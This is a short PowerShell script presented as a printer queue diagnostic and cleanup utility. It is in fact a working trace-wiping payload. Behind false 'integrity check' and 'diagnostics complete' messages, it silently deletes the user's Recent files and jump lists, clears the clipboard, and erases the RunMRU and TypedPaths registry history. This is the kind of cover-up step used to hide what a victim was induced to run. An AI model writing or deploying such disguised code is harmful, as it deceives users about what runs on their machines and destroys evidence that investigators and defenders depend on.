# Core Diagnostic Payload – System Cleanup Utility
Write-Host "🔧 Initializing Printer Queue Integrity Check..." -ForegroundColor Cyan

# Simulated payload execution
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
Set-Clipboard -Value ""

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Get-ItemProperty -Path $regPath | ForEach-Object {
    $_.PSObject.Properties | Where-Object { $_.Name -ne "MRUList" } | ForEach-Object {
        Remove-ItemProperty -Path $regPath -Name $_.Name -ErrorAction SilentlyContinue
    }
}

Clear-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Name * -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue

Write-Host "Print queue diagnostics complete." -ForegroundColor Green
